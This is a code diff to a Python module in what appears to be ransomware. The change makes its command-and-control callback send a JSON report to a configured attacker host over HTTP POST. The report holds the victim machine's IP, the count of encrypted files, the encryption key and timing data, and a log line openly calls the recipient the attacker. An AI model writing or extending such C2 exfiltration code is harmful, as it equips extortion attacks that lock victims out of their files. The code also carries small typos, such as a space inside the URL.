@@ -2,11 +2,14 @@
 Calback to C2 server.
 """
 
+import json
 import socket
-from dataclasses import dataclass
+import urllib.request
+from dataclasses import asdict, dataclass
 from datetime import datetime, timezone
 from pathlib import Path
 
+import config
 from utils.logger import get_logger
 
 
@@ -14,7 +17,7 @@ from utils.logger import get_logger
 class C2Report:
     ip: str
     file_encrypted: int
-    aes_key: str
+    key: str
     duration: float
     timestamp: str
 
@@ -22,12 +25,12 @@ class C2Report:
 class C2Integration:
     def __init__(
         self,
-        c2_host: str,
-        c2_port: int,
+        c2_host: str | None = None,
+        c2_port: int | None = None,
         log_file: Path | None = None,
     ):
-        self._host = c2_host
-        self._port = c2_port
+        self._host = c2_host or config.CALLBACK_SERVER_HOST
+        self._port = c2_port or config.CALLBACK_SERVER_PORT
 
         self._logger = get_logger(__name__, log_file=log_file)
 
@@ -39,7 +42,7 @@ class C2Integration:
     ):
         return C2Report(
             ip=socket.gethostbyname(socket.gethostname()),
-            aes_key=aes_key,
+            key=aes_key,
             file_encrypted=file_encrypted,
             duration=duration,
             timestamp=datetime.now(timezone.utc).isoformat(),
@@ -49,4 +52,20 @@ class C2Integration:
         self,
         payload: C2Report,
     ):
-        self._logger.info(payload)
+        payload_str = json.dumps(asdict(payload), indent=2, ensure_ascii=False)
+        try:
+            req = urllib.request.Request(
+                url=f"http://{self._host}: {self._port}/callback",
+                data=payload_str.encode("utf-8"),
+                headers={
+                    "Content-Type": "application/json",
+                },
+                method="POST",
+            )
+            self._logger.debug("Sending callback data to atacker: %s", payload_str)
+            urllib.request.urlopen(url=req, timeout=300)
+            self._logger.debug(
+                "Callbacked sent",
+            )
+        except Exception as e:
+            self._logger.exception(e)
